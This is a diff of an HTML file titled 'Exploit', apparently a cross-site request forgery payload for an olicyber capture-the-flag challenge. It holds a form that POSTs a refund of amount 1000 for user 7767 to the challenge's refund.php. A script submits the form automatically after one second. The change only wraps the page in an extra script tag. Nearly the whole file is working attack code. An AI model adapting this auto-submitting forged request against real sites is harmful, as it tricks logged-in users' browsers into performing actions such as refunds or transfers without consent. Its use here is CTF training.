@@ -1,22 +1,24 @@
-<html>
-  <title>Exploit</title>
+<script>
+  <html>
+    <title>Exploit</title>
 
-  <body>
-    <form
-      action="https://meme_shop_review.challs.olicyber.it/refund.php"
-      method="POST"
-      id="form"
-    >
-      <input class="form-input" type="number" name="amount" value="1000" />
-      <input type="number" name="user_id" value="7767" />
-      <input type="submit" value="" />
-    </form>
+    <body>
+      <form
+        action="https://meme_shop_review.challs.olicyber.it/refund.php"
+        method="POST"
+        id="form"
+      >
+        <input class="form-input" type="number" name="amount" value="1000" />
+        <input type="number" name="user_id" value="7767" />
+        <input type="submit" value="" />
+      </form>
 
-    <script>
-      setTimeout(() => {
-        console.log("log");
-        document.getElementById("form").submit();
-      }, 1000);
-    </script>
-  </body>
-</html>
+      <script>
+        setTimeout(() => {
+          console.log("log");
+          document.getElementById("form").submit();
+        }, 1000);
+      </script>
+    </body>
+  </html>
+</script>
